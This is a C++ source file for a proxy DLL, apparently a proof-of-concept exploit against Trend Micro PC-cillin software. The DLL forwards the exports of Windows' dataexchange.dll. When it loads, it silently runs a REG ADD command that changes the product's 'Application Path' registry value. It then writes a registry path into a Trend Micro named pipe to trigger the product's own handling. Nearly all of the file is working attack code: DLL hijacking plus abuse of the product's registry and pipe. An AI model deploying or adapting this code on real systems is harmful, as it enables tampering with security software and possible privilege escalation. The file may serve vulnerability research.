// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

#include <windows.h>
#include <stdio.h>

#pragma comment(linker, "/export:DllCanUnloadNow=dataexchange.DllCanUnloadNow")
#pragma comment(linker, "/export:DllGetActivationFactory=dataexchange.DllGetActivationFactory")
#pragma comment(linker, "/export:DllGetClassObject=dataexchange.DllGetClassObject")

#define ORIGINAL_COM_DLL_PATH "C:\\Windows\\System32\\dataexchange.dll"
#define PIPE_NAME "\\\\.\\pipe\\TMLISTEN_PIPE_2218EBAB_63F8_49E4_930C_AF69E77928AF"
#define REG_CMD "REG ADD HKLM\\SOFTWARE\\WOW6432Node\\TrendMicro\\PC-cillinNTCorp\\CurrentVersion /v \"Application Path\" /t REG_SZ /d \"C:\\poc\\AAAA\" /f"

HMODULE hOriginalDll = NULL;

void ConnectAndReplayPipe()
{
    HANDLE hPipe = CreateFileA(
        PIPE_NAME,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hPipe != INVALID_HANDLE_VALUE)
    {
        const char* registryPathData =
            "SOFTWARE\\TrendMicro\\PC-cillinNTCorp\\CurrentVersion\\Misc";

        DWORD bytesWritten = 0;
        WriteFile(hPipe, registryPathData, (DWORD)strlen(registryPathData), &bytesWritten, NULL);
        CloseHandle(hPipe);
    }
}

void ExecutePayload()
{
    WinExec(REG_CMD, SW_HIDE);
    ConnectAndReplayPipe();
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        MessageBoxA(NULL, "Hi from malicious iframe.dll", "iframe.dll", MB_OK);
        ExecutePayload();

        // Load original DLL
        if (!hOriginalDll)
        {
            hOriginalDll = LoadLibraryA(ORIGINAL_COM_DLL_PATH);
        }
    }

    return TRUE;
}
